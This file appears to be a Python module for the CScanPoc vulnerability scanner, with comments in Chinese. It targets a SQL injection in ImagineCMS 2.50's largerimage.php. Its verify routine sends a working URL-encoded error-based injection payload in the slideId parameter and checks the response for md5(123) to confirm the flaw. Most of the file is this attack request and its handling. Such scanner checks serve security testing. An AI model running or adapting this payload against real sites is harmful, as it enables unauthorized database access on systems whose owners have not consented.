# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'ImagineCMS_0002'  # 平台漏洞编号，留空
    name = 'ImagineCMS largerimage.php 注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2010-07-21'  # 漏洞公布时间
    desc = '''
        ImagineCMS 2.50 - SQL Injection
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/14426/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ImagineCMS'  # 漏洞应用名称
    product_version = '2.50'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8496d46c-0726-4aa8-91d1-f9162790e933'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            target = arg+'/largerimage.php?width=900&height=675&size=medium&slideId=233%20AND%20%28SELECT%20%2a%20FROM%20%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2C%28MID%28%28IFNULL%28CAST%28%28select%20md5%28123%29%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20%0A'
            code, head, res, errcode, _ = hh.http(target)
            if code == 200 and '202cb962ac59075b964b07152d234b70' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
